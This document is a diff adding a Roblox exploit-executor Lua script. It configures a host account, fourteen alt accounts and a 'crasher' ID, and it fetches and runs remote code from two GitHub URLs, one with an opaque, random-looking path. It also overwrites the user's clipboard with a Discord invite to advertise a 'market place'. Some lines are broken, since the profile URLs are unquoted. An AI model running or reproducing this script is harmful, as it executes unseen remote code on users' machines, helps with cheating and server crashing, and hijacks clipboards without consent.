@@ -1,0 +1,40 @@
+getgenv().Settings = {
+    host = 703071254,
+    fps = 5,
+    prefix = '.',
+    advertmsg = 'vouch',
+}
+getgenv().Alts = {
+    Alt1 = https://www.roblox.com/users/1836475549/profile,
+    Alt2 = https://www.roblox.com/users/3448290378/profile,
+    Alt3 = https://www.roblox.com/users/3419818022/profile,
+    Alt4 = https://www.roblox.com/users/3419822152/profile,
+    Alt5 = https://www.roblox.com/users/3452690303/profile,
+    Alt6 = https://www.roblox.com/users/3452692652/profile,
+    Alt7 = https://www.roblox.com/users/3452694023/profile,
+    Alt8 = https://www.roblox.com/users/3452696970/profile,
+    Alt9 = https://www.roblox.com/users/3452706118/profile,
+    Alt10 = https://www.roblox.com/users/3452721010/profile,
+    Alt11 = https://www.roblox.com/users/2769188436/profile,
+    Alt12 = https://www.roblox.com/users/2769137484/profile,
+    Alt13 = https://www.roblox.com/users/2538087318/profile,
+    Alt14 = https://www.roblox.com/users/2650057821/profile,
+    CrasherIDs = { 703071254 }
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/6JmFXvbZGV5pDuuV/oKh132klHas8/main/2ajKAnWX82"))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/W9K/roblox-scripts/main/DHC/SimpleSeller.lua', true))()
+
+local CoreGui = game:GetService("StarterGui")
+
+CoreGui:SetCore("SendNotification", {
+	Title = "Join 1542x1's Market Place!";
+	Text = "Link Copied To Your Clipboard!";
+	Duration = 5;
+	--Callback here
+	Button1 = "";
+	Button2 = "";
+
+})
+
+setclipboard("discord.gg/1542x1")
+toclipboard("discord.gg/1542x1")
